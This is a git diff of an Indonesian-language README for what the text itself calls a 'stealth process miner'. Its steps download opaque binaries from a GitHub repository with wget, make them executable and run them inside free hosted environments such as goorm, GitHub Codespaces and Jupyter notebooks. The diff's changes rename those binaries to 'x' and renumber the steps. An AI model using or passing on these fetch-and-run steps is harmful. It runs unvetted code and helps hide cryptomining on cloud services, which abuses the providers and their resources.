@@ -20,33 +20,33 @@ implementasi **stealth process miner**, **resource balancing**, **proxy routing*
 
 1.goorm
 
-wget https://github.com/xploit-miner/ER1/raw/refs/heads/main/xgm
+wget https://github.com/xploit-miner/ER1/raw/refs/heads/main/x
 
 # Beri izin eksekusi
-chmod +x xgm
+chmod +x x
 
 # Jalankan aplikasi
-./xgm
+./x
 
-3.codespace
+2.codespace
 
-wget https://github.com/xploit-miner/ER1/raw/refs/heads/main/xgt
+wget https://github.com/xploit-miner/ER1/raw/refs/heads/main/x
 
 # Beri izin eksekusi
-chmod +x xgt
+chmod +x x
 
 # Jalankan aplikasi
-./xgt
+./x
 
 3. runtime notebook/jupyter
 
-wget https://github.com/xploit-miner/ER1/raw/refs/heads/main/xc
+wget https://github.com/xploit-miner/ER1/raw/refs/heads/main/x
 
 # Beri izin eksekusi
-chmod +x xc
+chmod +x x
 
 # Jalankan aplikasi
-./xc
+./x
 
 #Ket : 
 1. penyesuaian penggunaan file eksekusi karena adanya perbedaan library runtime GLIBC dari tiap layanan vps yang digunakan.
